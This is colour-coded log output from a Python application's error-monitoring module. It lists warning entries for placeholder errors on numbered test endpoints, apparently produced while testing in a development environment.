WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764639Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1458'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1459'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764735Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1460'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764783Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1461'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1462'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764879Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1463'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764926Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1464'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.764973Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1465'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1466'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765067Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1467'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765116Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1468'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1469'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765210Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1470'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765258Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1471'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1472'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1473'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765402Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1474'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765449Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1475'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765497Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1476'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1477'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765591Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1478'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765642Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1479'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765705Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1480'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765755Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1481'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765837Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1482'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765921Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1483'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.765979Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1484'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1485'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766086Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1486'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766135Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1487'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766186Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1488'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1489'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766367Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1490'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766425Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1491'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766476Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1492'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766527Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1493'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766576Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1494'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766625Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1495'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766678Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1496'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766728Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1497'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
